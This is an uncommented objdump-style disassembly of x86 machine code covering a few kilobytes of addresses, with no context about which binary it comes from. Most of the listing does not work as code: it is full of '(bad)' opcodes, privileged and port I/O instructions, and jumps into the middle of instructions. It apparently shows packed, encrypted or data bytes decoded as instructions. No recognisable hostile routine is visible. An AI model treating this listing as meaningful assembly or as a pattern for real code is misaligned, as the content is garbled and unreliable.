  40ecf1:	mov    DWORD PTR ds:0x4f8c98b,eax
  40ecf7:	rcl    BYTE PTR [esi+0xf],1
  40ecfa:	iret   
  40ecfb:	inc    ebp
  40ecfc:	leave  
  40ecfd:	(bad)  
  40ecfe:	dec    DWORD PTR [ecx]
  40ed00:	mov    eax,esi
  40ed02:	mov    eax,DWORD PTR [edi]
  40ed04:	mov    dh,0xd1
  40ed07:	push   es
  40ed08:	nop
  40ed09:	(bad)  
  40ed0a:	inc    DWORD PTR [ebx]
  40ed0c:	push   esi
  40ed0d:	leave  
  40ed0e:	iret   
  40ed0f:	add    al,0x46
  40ed11:	push   ebp
  40ed12:	in     eax,0xec
  40ed14:	push   ebp
  40ed15:	push   ecx
  40ed16:	inc    DWORD PTR [ebp+0x56]
  40ed19:	mov    DWORD PTR [esi-0x4],eax
  40ed1c:	loope  0x40ed73
  40ed1e:	sbb    BYTE PTR [eax+0x7c6daff],bh
  40ed24:	add    al,BYTE PTR [edx]
  40ed26:	mov    edx,DWORD PTR [ebp-0x17]
  40ed29:	cmp    edi,esi
  40ed2b:	jne    0x40ed2c
  40ed2d:	(bad)  
  40ed2e:	push   esi
  40ed2f:	pop    es
  40ed30:	push   ebp
  40ed31:	mov    ebp,esp
  40ed33:	or     BYTE PTR [ebp+0x41],al
  40ed36:	add    edi,edx
  40ed38:	sub    BYTE PTR [eax-0x4],al
  40ed3b:	ret    0xc275
  40ed3e:	add    DWORD PTR [eax],eax
  40ed40:	sbb    al,0x8b
  40ed42:	mov    edx,DWORD PTR [ecx+0x14]
  40ed45:	lea    edx,[edx-0x1ba7508]
  40ed4b:	push   esi
  40ed4c:	enter  0xd375,0xb8
  40ed50:	test   DWORD PTR [esi],0x6ce0750
  40ed56:	enter  0xd375,0x3b
  40ed5a:	neg    DWORD PTR [esi+0x50]
  40ed5d:	or     cl,dl
  40ed5f:	inc    edx
  40ed60:	(bad)  
  40ed61:	in     eax,dx
  40ed62:	in     al,dx
  40ed63:	(bad)  
  40ed64:	sub    eax,DWORD PTR [ebx]
  40ed66:	inc    eax
  40ed67:	in     eax,dx
  40ed68:	push   eax
  40ed69:	add    dl,BYTE PTR [eax-0x37]
  40ed6c:	push   edi
  40ed6d:	push   ebp
  40ed6e:	imul   ah
  40ed70:	adc    DWORD PTR [ecx-0x1],0x45
  40ed74:	add    BYTE PTR [ecx+0x55d3fc00],cl
  40ed7a:	lea    edi,[eax-0x7fff4ca]
  40ed80:	mov    eax,0x4550402
  40ed85:	cmp    ebp,ecx
  40ed87:	jne    0x40ed34
  40ed89:	mov    eax,DWORD PTR ds:0x241e808
  40ed8f:	loope  0x40ed91
  40ed91:	inc    eax
  40ed92:	stc    
  40ed93:	xlat   BYTE PTR ds:[ebx]
  40ed94:	ss inc ecx
  40ed96:	aas    
  40ed97:	in     eax,0x7d
  40ed99:	ret    0x8b
  40ed9c:	lock mov edi,DWORD PTR [ebp-0x18]
  40eda0:	and    edi,edi
  40eda2:	mov    edi,edi
  40eda4:	call   0xe40eee80
  40eda9:	push   es
  40edaa:	add    al,ch
  40edac:	ud0    edx,DWORD PTR [ebp-0x7574ff01]
  40edb3:	(bad)  
  40edb4:	hlt    
  40edb5:	add    eax,0xffd3e87d
  40edba:	cmp    bh,0x8
  40edbd:	(bad)  
  40edbe:	fld    DWORD PTR [esi]
  40edc0:	out    dx,al
  40edc1:	call   0xff9fecc9
  40edc6:	cmp    al,0x46
  40edc8:	shr    esp,0x8
  40edcb:	(bad)  
  40edcc:	pop    es
  40edcd:	fisttp QWORD PTR [ebp+0xe577eff]
  40edd3:	push   ebx
  40edd4:	add    BYTE PTR [ebx+0x24008b56],cl
  40edda:	add    BYTE PTR [ebp+0x50],al
  40eddd:	push   eax
  40edde:	add    DWORD PTR [ebx+0x757d1834],ecx
  40ede4:	sub    edx,DWORD PTR [esi-0x24]
  40ede7:	jne    0x40ed9f
  40ede9:	lods   eax,DWORD PTR ds:[esi]
  40edea:	mov    edx,DWORD PTR [edx-0x34]
  40eded:	dec    esi
  40edee:	out    0x83,eax
  40edf0:	into   
  40edf1:	push   edi
  40edf3:	loopne 0x40edc3
  40edf5:	shr    BYTE PTR [edx+ecx*4+0x0],1
  40edf9:	xor    DWORD PTR [eax-0x741fff01],0xffffffd0
  40ee00:	rol    DWORD PTR [edx],0x8
  40ee03:	mov    esp,ecx
  40ee05:	cmp    DWORD PTR [ebx],0xc
  40ee08:	mov    esi,0x5001c0
  40ee0d:	push   eax
  40ee0e:	push   cs
  40ee0f:	push   eax
  40ee10:	(bad)  
  40ee11:	sub    edx,edi
  40ee13:	push   esi
  40ee14:	adc    al,0xcb
  40ee16:	ins    DWORD PTR es:[edi],dx
  40ee17:	mov    eax,0x203e8
  40ee1c:	add    al,ah
  40ee1e:	inc    esi
  40ee1f:	mov    al,ch
  40ee21:	pop    es
  40ee22:	add    DWORD PTR [eax],0x1
  40ee25:	add    dh,al
  40ee27:	add    ah,ch
  40ee29:	rol    DWORD PTR [edx-0xd],1
  40ee2c:	cli    
  40ee2d:	push   0x4a
  40ee2f:	pop    ecx
  40ee30:	retf   0xfe6
  40ee33:	add    BYTE PTR [ebx-0x4e72f41e],al
  40ee39:	(bad)  
  40ee3a:	dec    BYTE PTR [ebx+0x45b1fc72]
  40ee40:	(bad)  
  40ee41:	sub    ebp,DWORD PTR [ebx]
  40ee43:	and    al,0x52
  40ee45:	(bad)  
  40ee46:	dec    edi
  40ee47:	inc    ebp
  40ee48:	shl    DWORD PTR [eax+0x24fe8c8],0x0
  40ee4f:	add    BYTE PTR [ebp-0x7b],dh
  40ee52:	pop    eax
  40ee53:	add    BYTE PTR [edx+0x0],bl
  40ee56:	pop    edx
  40ee57:	dec    ebp
  40ee58:	jmp    DWORD PTR [ebx]
  40ee5a:	and    al,0xec
  40ee5c:	push   edx
  40ee5d:	out    0x64,eax
  40ee5f:	jmp    0xd3f2e464
  40ee64:	jmp    0x40eebe
  40ee66:	mov    al,0xfe
  40ee68:	dec    BYTE PTR [ebp-0x18fd8018]
  40ee6e:	add    BYTE PTR [esi+ebp*1],bh
  40ee71:	pop    edx
  40ee72:	icebp  
  40ee73:	mov    eax,cs
  40ee75:	ins    BYTE PTR es:[edi],dx
  40ee76:	adc    eax,0x75510000
  40ee7b:	mov    esi,0x70158
  40ee80:	or     DWORD PTR [eax-0x74f48dfe],esi
  40ee86:	mov    edi,esp
  40ee88:	cld    
  40ee89:	jge    0x40ef00
  40ee8b:	(bad)  
  40ee8d:	aas    
  40ee8e:	and    al,0x6d
  40ee90:	adc    cl,0x1
  40ee93:	mov    eax,DWORD PTR [eax]
  40ee95:	and    ecx,DWORD PTR [ebx-0x167203fd]
  40ee9b:	dec    ebp
  40ee9c:	add    eax,ebp
  40ee9e:	add    BYTE PTR [edx],al
  40eea0:	fadd   DWORD PTR [eax]
  40eea2:	stc    
  40eea3:	enter  0xee00,0x8b
  40eea7:	sbb    eax,0x1
  40eeaa:	sbb    esi,ecx
  40eeac:	in     al,0x0
  40eeae:	in     eax,dx
  40eeaf:	add    BYTE PTR [eax],al
  40eeb1:	jne    0x40ee3e
  40eeb3:	cmp    edx,esp
  40eeb5:	jb     0x40eec0
  40eeb7:	jmp    0x40ef2e
  40eeb9:	mov    ecx,DWORD PTR [ebx+0x4d91d4cc]
  40eebf:	add    BYTE PTR [ebx+0x4d83d840],cl
  40eec5:	add    DWORD PTR [ebx+0x4d3bdcee],ecx
  40eecb:	jb     0x40ee56
  40eecd:	pop    edx
  40eece:	fadd   QWORD PTR [ebx-0x7445faa1]
  40eed4:	or     dh,BYTE PTR [edx+0x0]
  40eed7:	inc    edx
  40eed8:	or     dl,bh
  40eeda:	xlat   BYTE PTR ds:[ebx]
  40eedb:	dec    edx
  40eedc:	push   edi
  40eedd:	add    al,0x7
  40eedf:	leave  
  40eee0:	rol    DWORD PTR [edx+eax*1],0x7
  40eee4:	add    ecx,ecx
  40eee6:	mov    edx,ecx
  40eee8:	int3   
  40eee9:	jmp    0x40eea9
  40eeeb:	mov    al,0x0
  40eeed:	(bad)  
  40eeee:	jne    0x40eed8
  40eef0:	mov    eax,DWORD PTR [edx]
  40eef2:	call   0xc1556bf7
  40eef7:	pop    edi
  40eef8:	add    ebx,DWORD PTR [ecx-0x37]
  40eefb:	pop    ecx
  40eefc:	or     BYTE PTR [ecx*4-0x1445b8af],dh
  40ef03:	push   es
  40ef04:	mov    eax,DWORD PTR [eax]
  40ef06:	int3   
  40ef07:	add    ch,al
  40ef09:	jae    0x40eef3
  40ef0b:	int    0x1
  40ef0d:	enter  0x3000,0x18
  40ef11:	add    BYTE PTR [ebp+0x75],al
  40ef14:	mov    esi,DWORD PTR [eax-0x171f0134]
  40ef1a:	push   0x2
  40ef1c:	pop    ecx
  40ef1d:	add    BYTE PTR [eax],cl
  40ef1f:	push   ebx
  40ef20:	lea    edi,[edi+eax*2]
  40ef23:	mov    al,0x1
  40ef25:	jb     0x40ef27
  40ef27:	mov    al,0x10
  40ef29:	push   eax
  40ef2a:	add    al,0x75
  40ef2c:	add    BYTE PTR [ebx],ch
  40ef2e:	add    ebx,esp
  40ef30:	int3   
  40ef31:	jne    0x40ef43
  40ef33:	movsx  edx,cl
  40ef36:	add    DWORD PTR [eax],eax
  40ef38:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  40ef3f:	mov    gs,edi
  40ef41:	add    BYTE PTR [eax-0x50],ch
  40ef44:	add    al,ch
  40ef46:	mov    eax,DWORD PTR [ecx]
  40ef48:	sub    eax,DWORD PTR [eax]
  40ef4a:	jb     0x40efc1
  40ef4c:	add    DWORD PTR [esp+eiz*8-0x50],esi
  40ef50:	jge    0x40ef3a
  40ef52:	add    al,0x1
  40ef54:	add    DWORD PTR [eax],0x0
  40ef57:	jne    0x40ef59
  40ef59:	je     0x40efa0
  40ef5b:	mov    eax,DWORD PTR [edi]
  40ef5d:	ror    BYTE PTR [ebp+0x4d],1
  40ef60:	or     DWORD PTR [ecx+0x4d03d004],0x3
  40ef67:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  40ef6d:	mov    DWORD PTR [ebx],ebp
  40ef6f:	fadd   DWORD PTR [eax+0x75]
  40ef72:	inc    eax
  40ef73:	pop    eax
  40ef74:	lea    ebx,[ecx+0x4f]
  40ef77:	push   0xb1000003
  40ef7c:	out    dx,eax
  40ef7d:	add    ebp,DWORD PTR [edx+edx*2]
  40ef80:	add    BYTE PTR [ebx+ecx*4],bh
  40ef83:	mov    ch,BYTE PTR [ebx]
  40ef85:	jb     0x40eff9
  40ef87:	add    al,0x89
  40ef89:	push   eax
  40ef8a:	call   0x84293cfc
  40ef8f:	add    DWORD PTR [eax+eax*1],eax
  40ef92:	jae    0x40efa8
  40ef94:	icebp  
  40ef95:	inc    ebp
  40ef96:	mov    eax,DWORD PTR gs:[ecx]
  40ef99:	int3   
  40ef9a:	out    dx,al
  40ef9b:	loopne 0x40efea
  40ef9d:	sub    eax,DWORD PTR [edx]
  40ef9f:	push   0xffffff83
  40efa1:	pop    esi
  40efa2:	push   cs
  40efa3:	jl     0x40efbe
  40efa5:	add    al,0xaf
  40efa7:	xor    eax,0x832b6d00
  40efac:	mov    eax,DWORD PTR [edx]
  40efae:	rcr    BYTE PTR [ebp+0x754500dc],cl
  40efb4:	ror    DWORD PTR [ebx+0x7dc8e803],1
  40efba:	inc    ebp
  40efbb:	shr    ebx,0x3
  40efbe:	or     DWORD PTR [eax],0x4
  40efc1:	push   0xffffffa5
  40efc3:	pop    esi
  40efc4:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  40efcb:	jmp    0x40f02a
  40efcd:	mov    edi,0xff0272
  40efd2:	fdivr  QWORD PTR [ebp+0x5d]
  40efd5:	push   0x4e
  40efd7:	pop    ecx
  40efd8:	call   0x4133dd
  40efdd:	mov    DWORD PTR [ebx],eax
  40efdf:	in     al,0xc8
  40efe1:	rol    BYTE PTR [ebp-0x75],0xc1
  40efe5:	call   0xaaf1c6
  40efea:	pop    esi
  40efeb:	enter  0xceff,0x8b
  40efef:	repz mov ecx,DWORD PTR [ebp-0x34]
  40eff3:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  40effa:	je     0x40effc
  40effc:	or     DWORD PTR [ebx-0x74183b24],eax
  40f002:	jne    0x40efe8
  40f004:	jmp    0x40efff
  40f006:	push   DWORD PTR [edx-0x24]
  40f009:	push   0x4d
  40f00b:	pop    ecx
  40f00c:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
  40f010:	jge    0x40f018
  40f012:	mov    eax,eax
  40f014:	sub    ebp,DWORD PTR [edx+0x24]
  40f017:	pop    esi
  40f018:	inc    ebp
  40f019:	mov    esp,0x8b6077
  40f01e:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  40f024:	lods   al,BYTE PTR ds:[esi]
  40f025:	add    BYTE PTR [ebx],bh
  40f027:	enter  0xce73,0x49
  40f02b:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
  40f033:	stc    
  40f034:	jge    0x40f0a8
  40f036:	jnp    0xdd407397
  40f03c:	call   0xc3f112
  40f041:	fadd   st(0),st
  40f043:	dec    esi
  40f044:	ins    BYTE PTR es:[edi],dx
  40f045:	stc    
  40f046:	cmp    al,0x73
  40f048:	push   ebp
  40f049:	mov    eax,0xf8028b
  40f04e:	jne    0x40f011
  40f050:	mov    esi,ecx
  40f052:	mov    esp,DWORD PTR [ebp+0x2c]
  40f055:	add    edi,DWORD PTR [ebp-0x24]
  40f058:	sub    esp,eax
  40f05a:	and    al,0x45
  40f05c:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
  40f062:	sbb    al,0xee
  40f064:	pop    esi
  40f065:	call   0x80f095
  40f06a:	fsubr  st,st(3)
  40f06c:	sti    
  40f06d:	add    BYTE PTR gs:[ecx],bh
  40f070:	add    eax,esp
  40f072:	add    DWORD PTR [esi],eax
  40f074:	rol    DWORD PTR [ebp+0x8],0x29
  40f078:	mov    esp,eax
  40f07a:	clc    
  40f07b:	jne    0x40f0f2
  40f07d:	mov    eax,0x8b0673
  40f082:	loopne 0x40f0c9
  40f084:	loopne 0x40f00f
  40f086:	lods   al,BYTE PTR ds:[esi]
  40f087:	int3   
  40f088:	inc    ebp
  40f089:	mov    DWORD PTR gs:[eax+edi*8],eax
  40f08d:	add    al,0xc3
  40f08f:	sub    ecx,DWORD PTR [ebp+0x47]
  40f092:	(bad)  
  40f094:	shr    BYTE PTR [ebp-0x1f],0xe8
  40f098:	add    eax,DWORD PTR [eax]
  40f09a:	call   0x642b19f
  40f09f:	add    esi,DWORD PTR [esi-0x3b2efc83]
  40f0a5:	dec    esi
  40f0a6:	ins    DWORD PTR es:[edi],dx
  40f0a7:	in     al,dx
  40f0a8:	lea    eax,[eax]
  40f0aa:	inc    ebp
  40f0ab:	inc    ebp
  40f0ac:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  40f0b2:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  40f0bc:	and    al,0xdc
  40f0be:	ror    DWORD PTR [edx+0x24],0xf7
  40f0c2:	or     BYTE PTR [ebp+0x4c],dh
  40f0c5:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  40f0c9:	stos   BYTE PTR es:[edi],al
  40f0ca:	adc    edx,edi
  40f0cc:	inc    esp
  40f0cd:	add    edi,DWORD PTR [eax]
  40f0cf:	jne    0x40f0b4
  40f0d1:	mov    DWORD PTR [eax-0x7449db04],ecx
  40f0d7:	cmp    ecx,DWORD PTR [edi]
  40f0d9:	sub    BYTE PTR [ebp-0x7e],dl
  40f0dc:	sar    ebp,0xb
  40f0df:	jmp    FWORD PTR [edi+0x2400392a]
  40f0e5:	sub    esi,DWORD PTR [ebx-0x73]
  40f0e8:	mov    esp,DWORD PTR [ecx+edi*4]
  40f0eb:	mov    ecx,DWORD PTR [eax]
  40f0ed:	and    BYTE PTR [eax],al
  40f0ef:	jne    0x40f0bb
  40f0f1:	sub    ebp,ecx
  40f0f3:	sbb    BYTE PTR [esi+0x32],ah
  40f0f6:	dec    ebp
  40f0f7:	push   ebp
  40f0f8:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  40f0fe:	ret    
  40f0ff:	mov    edx,ebp
  40f101:	leave  
  40f102:	sub    DWORD PTR [esi+0x24],ebx
  40f105:	ret    0x2b
  40f108:	pop    ax
  40f10a:	push   ebp
  40f10b:	rol    BYTE PTR [ebx],0xeb
  40f10e:	add    DWORD PTR [ecx+0x6c0001],0x40
  40f115:	jb     0x40f16c
  40f117:	ret    
  40f118:	in     al,dx
  40f119:	jecxz  0x40f0a6
  40f11b:	push   esi
  40f11c:	xchg   esp,eax
  40f11d:	jne    0x40f11f
  40f11f:	cmp    edx,DWORD PTR [esi+0x1c]
  40f122:	jne    0x40f108
  40f124:	mov    eax,DWORD PTR [ebp-0x77]
  40f127:	ror    DWORD PTR [ebx+0x899408],0xe0
  40f12e:	mov    esi,DWORD PTR [ebp-0x75]
  40f131:	pop    esi
  40f132:	nop
  40f133:	mov    eax,DWORD PTR [eax]
  40f135:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  40f13b:	add    al,0x0
  40f13d:	inc    ebp
  40f13e:	mov    eax,DWORD PTR [ebx]
  40f140:	mov    ebp,ebx
  40f142:	cmp    al,0xf
  40f144:	or     al,al
  40f146:	inc    ebp
  40f147:	inc    ebp
  40f148:	xor    eax,0x8bc89c8b
  40f14d:	ins    BYTE PTR es:[edi],dx
  40f14e:	cld    
  40f14f:	add    BYTE PTR [edi+0x566c16c0],dh
  40f155:	add    BYTE PTR [ecx-0x5],dl
  40f158:	add    eax,0x17200
  40f15d:	sbb    al,0x85
  40f15f:	dec    esp
  40f160:	je     0x40f19a
  40f162:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
  40f166:	add    BYTE PTR [ebx],bh
  40f168:	(bad)  
  40f169:	and    al,0x32
  40f16b:	jae    0x40f109
  40f16d:	mov    cl,cl
  40f16f:	inc    DWORD PTR [esp]
  40f172:	push   ebp
  40f173:	shr    esp,0x8
  40f176:	in     al,dx
  40f177:	push   esp
  40f178:	add    DWORD PTR [eax],esp
  40f17a:	add    bl,cl
  40f17c:	inc    ebp
  40f17d:	mov    bh,0x53
  40f17f:	add    BYTE PTR [ebp-0x17],al
  40f182:	push   esi
  40f183:	cmovne ecx,edx
  40f186:	xor    cl,BYTE PTR [esp+ebx*4+0x20]
  40f18a:	push   edi
  40f18b:	pop    ss
  40f18c:	xor    eax,0x89009cd9
  40f191:	add    ah,bh
  40f193:	sub    eax,DWORD PTR [ebp-0x3f]
  40f196:	aad    0x5
  40f198:	inc    ebp
  40f199:	add    edx,edx
  40f19b:	add    BYTE PTR [ebp-0x40],al
  40f19e:	xlat   BYTE PTR ds:[ebx]
  40f19f:	ins    BYTE PTR es:[edi],dx
  40f1a0:	inc    ebp
  40f1a1:	inc    eax
  40f1a2:	and    ecx,eax
  40f1a4:	dec    eax
  40f1a5:	add    eax,0x20204c45
  40f1aa:	inc    ebp
  40f1ab:	fnstcw WORD PTR [esi+0x29]
  40f1ae:	leave  
  40f1af:	add    BYTE PTR [esi+0xc000c0],bh
  40f1b5:	lea    eax,[esp-0x34]
  40f1b9:	ret    
  40f1ba:	mov    dh,0x8b
  40f1bc:	xor    edx,DWORD PTR [ecx+0x3]
  40f1bf:	mov    al,BYTE PTR [ecx+0x1]
  40f1c2:	sbb    BYTE PTR [eax],al
  40f1c4:	stc    
  40f1c5:	mov    esi,DWORD PTR [edx+0x8]
  40f1c8:	(bad)  
  40f1c9:	les    esi,FWORD PTR ss:[ecx]
  40f1cc:	(bad)  
  40f1cd:	mov    al,ch
  40f1cf:	add    esi,eax
  40f1d1:	add    dh,al
  40f1d3:	or     esi,eax
  40f1d5:	mov    dl,0xc7
  40f1d7:	add    esi,eax
  40f1d9:	add    al,cl
  40f1db:	push   cs
  40f1dc:	mov    BYTE PTR [edx+0xc601c9],0xca
  40f1e3:	or     BYTE PTR [ebx],dh
  40f1e5:	dec    ecx
  40f1e6:	lea    eax,[ebx]
  40f1e8:	or     eax,0x18fc0fc7
  40f1ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f1ee:	(bad)  
  40f1f0:	fiadd  WORD PTR [ebp-0x78]
  40f1f3:	jae    0xed75f942
  40f1f9:	or     BYTE PTR [ebp+0x7],al
  40f1fc:	loope  0x40f19b
  40f1fe:	inc    ebp
  40f1ff:	xor    dl,dh
  40f201:	pop    esi
  40f202:	inc    ebp
  40f203:	shr    edx,0xc
  40f206:	inc    ebp
  40f207:	and    ch,0x1
  40f20a:	inc    ebp
  40f20b:	add    bh,bl
  40f20d:	add    BYTE PTR [ebp-0x7b],al
  40f210:	out    dx,al
  40f211:	clc    
  40f212:	inc    ebp
  40f213:	ret    0xd7
  40f216:	inc    ebp
  40f217:	mov    edi,DWORD PTR [esi-0x7f]
  40f21a:	leave  
  40f21b:	sub    al,0x44
  40f21d:	add    BYTE PTR [ebx+ecx*4-0x76cce34a],bh
  40f224:	add    ebx,DWORD PTR [ecx+eax*2]
  40f227:	(bad)  
  40f228:	sbb    al,ah
  40f22a:	stc    
  40f22b:	test   DWORD PTR [edx-0x8],esi
  40f22e:	lea    edi,[edi-0x7007aa4]
  40f234:	mov    DWORD PTR [ebp-0x24],edi
  40f237:	(bad)  
  40f238:	dec    ebp
  40f239:	int3   
  40f23a:	mov    eax,0x71cdfcc6
  40f23f:	mov    BYTE PTR [ecx],0xce
  40f242:	(bad)  
  40f243:	(bad)  
  40f244:	dec    edi
  40f246:	jmp    FWORD PTR [edx-0x38]
  40f249:	(bad)  
  40f24a:	or     dl,al
  40f24c:	jge    0x40f214
  40f24e:	(bad)  
  40f24f:	shl    esp,1
  40f251:	xor    eax,DWORD PTR [ebp+0x45caf85a]
  40f257:	add    BYTE PTR [ebx+0xd8c8d],cl
  40f25d:	rdpmc  
  40f25f:	sbb    BYTE PTR [edi+0x7de08da],bh
  40f265:	mov    BYTE PTR [ebp+0x39063283],bl
  40f26b:	in     eax,dx
  40f26c:	cmovne ebx,DWORD PTR [edx]
  40f26f:	jecxz  0x40f271
  40f271:	inc    ebp
  40f272:	mov    esp,ecx
  40f274:	sbb    al,0x45
  40f276:	mov    ebx,edx
  40f278:	add    DWORD PTR [ebp+0x0],eax
  40f27b:	loopne 0x40f27e
  40f27d:	inc    ebp
  40f27e:	dec    ebp
  40f27f:	and    DWORD PTR [ebx+0x208045],ecx
  40f285:	inc    ebp
  40f286:	mov    DWORD PTR [esi+0x6a],edi
  40f289:	leave  
  40f28a:	mov    DWORD PTR [esp+edx*8-0x3c],0x33e5b6d6
  40f292:	inc    ebp
  40f293:	add    ebx,edi
  40f295:	inc    ecx
  40f296:	xlat   BYTE PTR ds:[ebx]
  40f297:	sbb    BYTE PTR [ebp-0x758d2b07],cl
  40f29d:	(bad)  
  40f29e:	xor    bh,BYTE PTR [eax+eax*4+0x8bd36c6]
  40f2a5:	(bad)  
  40f2a6:	dec    esi
  40f2a7:	mov    esi,0xbf45c6f3
  40f2ac:	mov    esi,eax
  40f2ae:	fadd   st,st(0)
  40f2b0:	inc    esi
  40f2b2:	(bad)  
  40f2b3:	rcl    esp,0xc6
  40f2b6:	inc    edx
  40f2b8:	push   eax
  40f2b9:	mov    BYTE PTR [ebp-0x3d],0x33
  40f2bd:	xor    eax,DWORD PTR [ebx]
  40f2bf:	lea    edx,[eax+0xd]
  40f2c2:	inc    ebp
  40f2c3:	jae    0x8c1b58e1
  40f2c9:	ficomp WORD PTR [eax+ecx*4]
  40f2cc:	add    BYTE PTR [ebx-0x12fff7ff],0x85
  40f2d3:	test   esi,edi
  40f2d5:	(bad)  
  40f2d6:	(bad)  
  40f2d7:	inc    DWORD PTR [eax]
  40f2d9:	inc    ebp
  40f2da:	add    BYTE PTR [ebx-0x10aa23d0],cl
  40f2e0:	mov    edx,DWORD PTR [ebx]
  40f2e2:	cld    
  40f2e3:	mov    edi,ecx
  40f2e5:	mov    ecx,ebx
  40f2e7:	pop    esp
  40f2e8:	sar    edi,0x1e
  40f2eb:	cmp    ebp,esp
  40f2ed:	jne    0x40f362
  40f2ef:	mov    DWORD PTR ds:0x22450be4,ecx
  40f2f5:	loopne 0x40f2e3
  40f2f7:	pushf  
  40f2f8:	jae    0x40f285
  40f2fa:	add    eax,0x3388e91c
  40f2ff:	add    esp,ebp
  40f301:	add    BYTE PTR [ebx-0x40],dh
  40f304:	jmp    0x91f35f
  40f309:	mov    ebx,0x6a7275
  40f30e:	pop    ecx
  40f30f:	add    DWORD PTR [ebp+eax*4-0x77],esi
  40f313:	add    bh,BYTE PTR [eax+0x0]
  40f316:	dec    DWORD PTR [ebp+0x66]
  40f319:	mov    ecx,DWORD PTR [ebp-0xff0084]
  40f31f:	mov    DWORD PTR [edx-0x75],ebp
  40f322:	data16 sbb al,0x8d
  40f325:	mov    edi,edi
  40f327:	add    edi,edi
  40f329:	add    BYTE PTR [edx+0x1],ch
  40f32c:	data16 or BYTE PTR [ebp-0x1e00bb],cl
  40f333:	jmp    0xee6a:0xd84dc766
  40f33a:	pop    ecx
  40f33b:	jle    0x40f2c6
  40f33d:	inc    ebp
  40f33e:	sbb    BYTE PTR [esi-0x37],0x8
  40f342:	test   edx,ecx
  40f344:	(bad)  
  40f345:	jmp    0x41017c49
  40f34a:	push   ebp
  40f34b:	jne    0x40f3b3
  40f34d:	lea    ecx,[ebp-0x2c]
  40f350:	mov    DWORD PTR [ebp-0x200158],0xfe4585d6
  40f35a:	sar    bh,0xeb
  40f35d:	mov    eax,edi
  40f35f:	loopne 0x40f311
  40f361:	(bad)  
  40f362:	rol    ebx,cl
  40f364:	jmp    0xe9c0:0xdf1c458b
  40f36b:	push   eax
  40f36c:	inc    bp
  40f36e:	inc    ebp
  40f36f:	mov    eax,ebp
  40f371:	cwde   
  40f372:	mov    DWORD PTR [eax],0xd4ffc7d4
  40f378:	add    bh,bh
  40f37a:	add    BYTE PTR [ecx],al
  40f37c:	call   0x1400b81
  40f381:	inc    DWORD PTR [ebp-0xb201f8]
  40f387:	xor    eax,DWORD PTR [ebp-0xc401fd]
  40f38d:	jne    0x40f31a
  40f38f:	mov    eax,ds:0x33c70be0
  40f394:	ret    
  40f395:	out    dx,eax
  40f396:	mov    edx,DWORD PTR ds:0xbc0a31c
  40f39c:	push   eax
  40f39d:	xor    eax,DWORD PTR [ebp-0x71]
  40f3a0:	mov    esi,DWORD PTR [edx-0x68]
  40f3a3:	mov    ds:0x33ff0b00,eax
  40f3a8:	(bad)  
  40f3a9:	mov    ecx,0x8b8d0008
  40f3ae:	call   FWORD PTR [edi+edi*8]
  40f3b1:	and    bh,bh
  40f3b3:	push   0x66
  40f3b5:	mov    bp,0xff8d
  40f3b9:	(bad)  
  40f3ba:	(bad)  
  40f3bb:	dec    DWORD PTR [edi]
  40f3bd:	mov    DWORD PTR [edx],eax
  40f3bf:	jp     0x40f3c1
  40f3c1:	(bad)  
  40f3c2:	mov    ecx,0x774f59
  40f3c7:	mov    ecx,eax
  40f3c9:	jl     0x40f354
  40f3cb:	dec    DWORD PTR [eax-0x74c73fa7]
  40f3d1:	mov    DWORD PTR [esi+0x7e],esp
  40f3d4:	push   ebp
  40f3d5:	dec    DWORD PTR [ebp-0x7676f2a7]
  40f3db:	or     BYTE PTR [ebx+eiz*2+0x4d6666c2],0x55
  40f3e3:	xor    ecx,DWORD PTR [ebp-0x7627e877]
  40f3e9:	call   DWORD PTR [eax+0x668dc233]
  40f3ef:	test   al,0x55
  40f3f1:	mov    DWORD PTR [ebp-0x76bade7c],ecx
  40f3f7:	into   
  40f3f8:	xchg   esp,eax
  40f3f9:	loop   0x40f384
  40f3fb:	(bad)  
  40f3fc:	xchg   esi,eax
  40f3fd:	lods   al,BYTE PTR ds:[esi]
  40f3fe:	ret    0x8bd3
  40f401:	in     eax,dx
  40f402:	inc    bp
  40f404:	dec    ebp
  40f405:	in     al,0xb9
  40f407:	xor    BYTE PTR [edi-0x39],cl
  40f40a:	add    BYTE PTR [ecx+esi*8+0x64e189ec],dh
  40f411:	(bad)  
  40f412:	(bad)  
  40f413:	mov    eax,0x85667e8b
  40f418:	mov    ch,0xfe
  40f41a:	(bad)  
  40f41b:	(bad)  
  40f41c:	inc    DWORD PTR [eax]
  40f41e:	jno    0x40f420
  40f420:	data16 mov bl,0xb5
  40f423:	add    bh,bh
  40f425:	mov    edi,edi
  40f427:	fmul   QWORD PTR [ecx-0x729501]
  40f42d:	aam    0x8d
  40f42f:	call   edi
  40f431:	push   eax
  40f432:	mov    DWORD PTR [ebp+0x6c],eax
  40f435:	xor    edi,edi
  40f437:	add    eax,DWORD PTR [ebx-0x76bafcb0]
  40f43d:	sub    DWORD PTR [esi+0x44],0xffffffff
  40f441:	mov    ecx,DWORD PTR [ebp-0x767f1ee4]
  40f447:	add    DWORD PTR [eax+0x0],esi
  40f44a:	push   DWORD PTR [eax]
  40f44c:	push   bp
  40f44e:	lea    ecx,[ebp-0x8701]
  40f454:	mov    DWORD PTR [ecx+0x74],edx
  40f457:	sar    bh,1
  40f459:	or     DWORD PTR [ebx-0x48000386],0x77
  40f460:	fs test edi,edi
  40f463:	add    al,0x33
  40f465:	add    BYTE PTR [ebx],al
  40f467:	adc    dh,BYTE PTR [ebx]
  40f469:	add    BYTE PTR [esi-0x75],ah
  40f46c:	test   DWORD PTR [esi-0x1],esp
  40f46f:	inc    ebp
  40f470:	inc    DWORD PTR [ebx-0x2ff00abb]
  40f476:	dec    ebp
  40f477:	mov    DWORD PTR [ebx],esi
  40f479:	mov    al,BYTE PTR [ebx]
  40f47b:	push   ecx
  40f47c:	xor    esp,DWORD PTR [esi+0x66]
